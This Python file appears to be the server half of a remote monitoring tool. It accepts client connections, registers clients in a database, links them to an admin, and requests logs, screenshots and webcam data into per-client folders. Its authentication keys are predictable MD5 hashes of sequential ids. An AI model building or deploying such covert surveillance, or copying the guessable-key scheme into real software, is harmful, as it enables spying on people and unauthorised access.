import hashlib
from socket import *
import threading
import os
import json
import shutil
from time import sleep
import serverClient

# a = serverClient.main(10,"127.0.0.1"serverClient,)
# https://certbot.eff.org/
# https://www.oshyn.com/blog/2017/11/windows-10-self-signed-certificates

SERVER_ADDRESS = ("0.0.0.0", 1279)
# socket lists made from (socket,address)

# todo create some sort of a thread lock as to stop race conditions and more, i.e stops the server from sending msg to check if user awake, when getting a procces asked from admin client then the process of checking if it is awake stops until he gets the authority back to the variable.
client_dic = {}
admin_dic = {}
thread_list = []
PATH = os.path.dirname(__file__)
USERS_PATH = os.path.join(PATH, "Users")
if not os.path.isdir(USERS_PATH):
    os.mkdir(USERS_PATH)


def main(database):
    print("eh?")
    global db, User
    db = database

    class User(db.Model):
        __tablename__ = "client"

        id = db.Column('id', db.Integer, primary_key=True)
        ip = db.Column('ip', db.String)
        key = db.Column('key', db.String, unique=True)
        path = db.Column('path', db.String, unique=True)
        relation = db.Column('relation', db.Integer)
        nick = db.Column('nick', db.String)
        log = db.Column("log", db.Boolean)
        img = db.Column("img", db.Boolean)
        web = db.Column("web", db.Boolean)
        end = db.Column("end", db.Boolean)

    db.create_all()
    serverClient.main(client_dic, db, User)

    s = Server()
    s.start()

    return s


# LOCKS = {}
print("here")


class Server(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
        self.socket = socket(AF_INET, SOCK_STREAM)
        self.socket.bind(SERVER_ADDRESS)
        self.socket.listen(100000)  # The serversock is listening to requests
        # self.lock = threading.Lock

    def run(self):
        """
        server runner, the one that establishes connection with clients
        :return:
        """

        global client_dic
        while 1:  # unlimited run
            print("Waiting for connection")
            client_socket, client_address = self.socket.accept()
            print(client_socket)
            print("Connected from : ", client_address)
            ip = client_address[0]
            print(type(ip))
            print("ip - ", ip)
            client_dir = os.path.join(USERS_PATH, ip)

            # gets identification key
            key = client_socket.recv(33).decode()
            print(key)
            # checks if key exists in database

            client = User.query.filter_by(key=key).first()

            if key == "0" * 33:
                if not client:
                    client = self.__initialize(ip, client_dir, client_socket)

            else:
                # in case he is in the database but the ip was changed
                if not client:
                    # malfunctioning client or something
                    client_socket.close()
                    continue

                if client.ip != ip:
                    client.ip = ip
                    db.session.commit()

            # starts process

            client_dic[client.id] = serverClient.Client(client_socket, ip, client)
            client_dic[client.id].start()

    def __initialize(self, ip, client_dir, client_socket):
        """
        Starts the initialization process with a new client who isn't in the database
        :param ip: client.id
        :param client_dir: half completed path to client dir
        :param client_socket: socket obj
        :return: User obj in database
        """
        user = User()
        user.ip = ip
        db.session.add(user)
        db.session.commit()
        user.path = client_dir + " " + str(user.id)
        user.key = hashlib.md5(str(user.id).encode()).hexdigest() + str(user.id)[0]
        user.log = False
        user.img = False
        user.web = False
        user.end = False

        # todo  adds relation (under work)
        client_socket.send(user.key.encode())

        relation = client_socket.recv(6).decode()
        user.relation = int(relation)

        db.session.commit()

        os.mkdir(user.path)

        open(os.path.join(user.path, "logs.txt"), 'w').close()

        os.mkdir(os.path.join(user.path, "images"))

        # webcam folder create
        os.mkdir(os.path.join(user.path, "webcam"))

        print("initalize")
        return user

    @staticmethod
    def get_clients(id):
        """
        receives id of user and returns all of the clients that have relation to him
        :param id: users.id
        :return: List containing [client.nick, client.ip, Boolean whether he is online or not, client.id]
        """
        clients = []
        users = User.query.filter_by(relation=id).all()
        print(users)
        for i in users:

            if i.id in client_dic.keys():
                clients.append([i.nick, i.ip, True, i.id])
            else:
                clients.append([i.nick, i.ip, False, i.id])
        return clients

    @staticmethod
    def fetch_data(id, action):
        """
        fetches specific data from client and returns if it worked
        :param id: client.id
        :param action: which type of action to do on the client. [log,img,web,end]
        :return: Boolean outcome - whether the outcome was successful or not
        """
        outcome = True
        if action == "log":
            outcome = client_dic[id].transport_info(logs=True)
        if action == "img":
            outcome = client_dic[id].transport_info(image=True)
        if action == "web":
            outcome = client_dic[id].transport_info(web=True)
        if action == "end":
            client_dic[id].end()

        return outcome

    @staticmethod
    def add_request(id, action):
        """
        adds action to the database so it will take action next time the client connects to the server.
        :param id: client.id
        :param action: which type of action to do on the client. [log,img,web,end]
        :return:  Boolean outcome - whether the outcome was successful or not
        """
        outcome = True
        client = User.query.filter_by(id=id).first()
        if action == "log":
            client.log = True
        elif action == "img":
            client.img = True
        elif action == "web":
            client.web = True
        elif action == "end":
            client.end = True
            client.relation = 0
        else:
            outcome = False
        db.session.commit()
        return outcome

    @staticmethod
    def isOnline(id):
        """
        checks if the client is online by checking if his id is in the keys of the client_dic which contains all of the active clients.
        :param id: client.id
        :return:  Boolean whether the client is on or not
        """
        return id in client_dic.keys()

    @staticmethod
    def get_client(id):
        """
        returns a client object by their id
        :param id: client.id
        :return: client obj
        """
        client = User.query.filter_by(id=id).first()
        return client

